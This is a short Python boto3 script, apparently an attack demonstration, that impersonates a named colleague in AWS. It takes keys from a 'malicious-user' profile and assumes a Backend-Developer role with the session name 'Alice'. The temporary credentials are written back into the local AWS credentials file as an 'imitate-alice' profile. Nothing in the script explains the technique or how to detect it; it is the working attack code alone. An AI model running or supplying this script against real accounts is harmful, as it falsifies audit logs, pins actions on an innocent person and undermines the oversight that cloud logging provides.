import boto3
import configparser
from pathlib import Path

IDENTITY_PROFILE = 'malicious-user'
ROLE_ARN = 'arn:aws:iam::<AWS_ACCOUNT_ID>:role/Backend-Developer'
ROLE_SESSION_NAME = 'Alice'
TAMPER_PROFILE = 'imitate-alice'

STS_REGION = 'us-east-1'
AWS_CREDENTIALS_FILE = Path.home() / '.aws/credentials'

print(f"Using profile {IDENTITY_PROFILE} to switch to {ROLE_ARN}/{ROLE_SESSION_NAME} ")
config = configparser.ConfigParser()
config.read(AWS_CREDENTIALS_FILE)

identity_aws_access_key = config.get(IDENTITY_PROFILE, 'aws_access_key_id')
identity_aws_secret_access_key = config.get(IDENTITY_PROFILE, 'aws_secret_access_key')
identity_aws_session_token = '' #config.get(IDENTITY_PROFILE, 'aws_session_token')

identity_session = boto3.Session(aws_access_key_id=identity_aws_access_key, aws_secret_access_key=identity_aws_secret_access_key, aws_session_token=identity_aws_session_token, region_name=STS_REGION)
sts = identity_session.client('sts')

security_creds = sts.assume_role(RoleArn=ROLE_ARN, RoleSessionName=ROLE_SESSION_NAME)['Credentials']

print(f'[+] generated session with key {security_creds["AccessKeyId"]} for {ROLE_SESSION_NAME}')

if not config.has_section(TAMPER_PROFILE):
    config.add_section(TAMPER_PROFILE)

config.set(TAMPER_PROFILE, 'aws_access_key_id', security_creds["AccessKeyId"])
config.set(TAMPER_PROFILE, 'aws_secret_access_key', security_creds["SecretAccessKey"])
config.set(TAMPER_PROFILE, 'aws_session_token', security_creds["SessionToken"])

with open(AWS_CREDENTIALS_FILE, 'w') as aws_credentials_file:
    config.write(aws_credentials_file)
